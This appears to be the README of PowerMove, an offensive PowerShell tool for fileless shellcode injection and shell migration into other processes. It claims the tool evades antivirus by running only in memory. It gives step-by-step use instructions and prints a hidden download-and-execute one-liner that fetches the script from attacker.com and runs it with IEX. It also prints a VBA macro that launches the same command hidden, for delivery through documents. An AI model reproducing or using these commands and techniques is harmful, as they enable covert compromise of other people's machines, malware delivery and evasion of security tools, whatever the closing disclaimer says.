![alt text](https://github.com/10N351R/PowerMove/blob/main/Images/Logo_video2.gif)
# PowerMove.ps1
Author: 10N351R


PowerMove is a fileless process injector written in PowerShell for injecting shellcode and migrating your shell to new processes. PowerMove uses common WINAPIs such as `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` to perform simple process injections. This combination of WINAPIs are often detected by anti-virus solutions when stored on disk but will bypass these protections when executed exclusively in memory.

Tested on PowerShell version: `5.1.19041.4522`

## Instructions
To use PowerMove in an existing PowerShell shell
1. Copy the contents of PowerMove.ps1 into a text editor
2. Edit the `$targetPid` variable with the PID of the target process to inject into
3. Edit the `$shellcode` variable with the payload you wish to inject
4. Copy the contents from the beginning `###` to the end `###` to your clipboard
5. Paste the contents into your existing PowerShell shell and press `Enter`
6. Enjoy the benifits fileless process injection

## Output
![alt text](https://github.com/10N351R/PowerMove/blob/main/Images/PowerMove_output.png)

# PowerMove_dynamic.ps1
`PowerMove_dynamic.ps1` was created to add dynamic PID resolution to enable remote execution via COM objects in a VBA macro without embedding.

Tested on PowerShell version: `5.1.26100.4202`

## Instructions
`PowerMove_dynamic.ps1` can be executed in a Visual Basic for Applications (VBA) macro, or directly from PowerShell.
1. Copy the contents of `PowerMove_dynamic.ps1` into a text editor
2. Edit the `$targetProcName` variable with the name of the process you want to target (eg. `notepad`,`explorer`,`svchost`)
3. Edit the `$shellcode` variable with the payload you wish to inject
4. Host `PowerMove_dynamic.ps1` on a server reachable by the target
5. Execute on the target

### Using PowerShell
```powershell
powershell.exe -nop -w hidden -Command ""$h=New-Object -ComObject 'Msxml2.XMLHTTP';$h.open('GET','http://attacker.com/PowerMove_dynamic.ps1',$false);$h.send();IEX $h.responseText""
```

### Using VBA Macro
```vba
Sub TEST()
    Dim ps As String
    ps = "powershell.exe -nop -w hidden -Command ""$h=New-Object -ComObject 'Msxml2.XMLHTTP';$h.open('GET','http://attacker.com/PowerMove_dynamic.ps1',$false);$h.send();IEX $h.responseText"""
    Shell ps, vbHide
End Sub
```

### Testing
```powershell
powershell.exe -nop -NoExit -Command ""$h=New-Object -ComObject 'Msxml2.XMLHTTP';$h.open('GET','https://raw.githubusercontent.com/10N351R/PowerMove/refs/heads/main/PowerMove_dynamic.ps1',$false);$h.send();IEX $h.responseText""
```

## Disclaimer
**Ethical Use:** PowerMove is provided for educational and lawful purposes only. The author is not responsible for any misuse or damaged caused by this tool. By using this tool, you agree to use it ethically and comply with all applicable laws and regulations. Unauthorized use of this tool is strictly prohibited and may result in severe legal consequences.

**Use Of Artificial Intelligence:** This tool was partially developed with the assistance of Artificial Intelligence (AI), and contains portions of code generated using OpenAI's ChatGPT, an AI language model.
